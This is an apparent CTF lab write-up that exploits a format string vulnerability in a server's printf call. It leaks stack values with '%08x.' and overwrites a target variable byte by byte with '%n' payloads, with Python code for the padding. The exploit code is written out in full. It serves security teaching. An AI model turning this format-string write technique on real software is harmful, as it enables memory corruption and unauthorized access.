# Challenge `Write Given Number` writeup

- Vulnerability:
  - _Endpoint has a **format string** vulnerability_
- Where:
  - _`printf` endpoint_
- Impact:
  - _Allows to **read and write the stack values and arbitrary registers** without having the authority to by using the (vulnerable) printf function in the server's code_

## Steps to reproduce

First we need to open a session in the server `http://mustard.stt.rnl.tecnico.ulisboa.pt:22196`. After the session is established we can now start plotting what to do.

By analysing the source code provided, we can see that there is a buffer being used to store the input of the user. The buffer has a size of 128, and afterwards, in the function `vuln`, is printed. We can see that the `printf` function is being used to print the buffer, and it has a format string vulnerability. 

This means that we can send `%08x.` characters to print the stack values. We need to see where in the stack our buffer is and update the targets value to something different. To check the **r and target address** we used the gdb debugger with the corresponding **binary** file. To get it, we made a breakpoint in **vuln** and used the following command:

```bash
gdb-peda$ p &r
$2 = (unsigned int *) 0x804a078 <r>


gdb-peda$ p &target
$1 = (unsigned int *) 0x804a070 <target>
```

Since we now have the address of the target we now need to know where in the stack the buffer starts. To do this we used the following payload:

```python
msg = (b"AAAA" + b"%08x."*20)
```

We obained: 
```bash
Your random value is: 0x736d8100
AAAAffffdc7c.0000007f.00000000.f7fe2a70.080481f8.00000001.41414141.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.
Oops, not quite! Target was: 00000000
```

Because we used the string `AAAA` as a reference, we can see that the buffer starts in the 7th place. Having this information, we can now try to overwrite the target value. This time around, we need to make the target have the value of r, which constantly changes. In order to do this, the chosen method was byte by byte. First we got to overwrite every byte using this as the message payload:

```python
msg = (
        b"\x70\xa0\x04\x08" + 
        b"\x71\xa0\x04\x08" +
        b"\x72\xa0\x04\x08" +
        b"\x73\xa0\x04\x08" +
        b"%7$n"+
        b"%8$n"+
        b"%9$n"+
        b"%10$n"
       )
```
We successfully overwrote the target value to **10101010**. This means we now just have to make padding adjustments to get the desired value. The code used to get the generated value of r and the calculations made for the necessary padding is the following:

```python
msg_received = r.recvline().decode()
r_value = msg_received[-9:]             # without the 0x

first_n = int(r_value[-3:],16)
second_n = int(r_value[-5:-3],16)
third_n = int(r_value[-7:-5],16)
forth_n = int(r_value[-9:-7],16)

# calculations for the padding
first_value = first_n - 16
if first_value < 0:
        first_value += 256
second_value = second_n - first_n
if second_value < 0:
        second_value += 256
third_value = third_n - second_n
if third_value < 0:
        third_value += 256
fourth_value = forth_n - third_n
if fourth_value < 0:
        fourth_value += 256
        
# convert to bytes
first_byte = str(first_value).encode()
second_byte = str(second_value).encode()
third_byte = str(third_value).encode()
fourth_byte = str(fourth_value).encode()
```

Since we have the paddings adjustments, we can now make the final payload:

```python
msg = (
        b"\x70\xa0\x04\x08" + 
        b"\x71\xa0\x04\x08" +
        b"\x72\xa0\x04\x08" +
        b"\x73\xa0\x04\x08" +
        b"%" + first_byte + b"x%7$n"+
        b"%" + second_byte + b"x%8$n"+
        b"%" + third_byte + b"x%9$n"+
        b"%" + fourth_byte + b"x%10$n"
       )


r.sendline(msg)

print(f"Flag: {r.recvall()}")

r.close()
```

Now, we can see that the server returned the `flag`. This means that we have successfully exploited the vulnerability and achieved our objective.

## Script

The script used can be found [here](write_given_number_poc.py)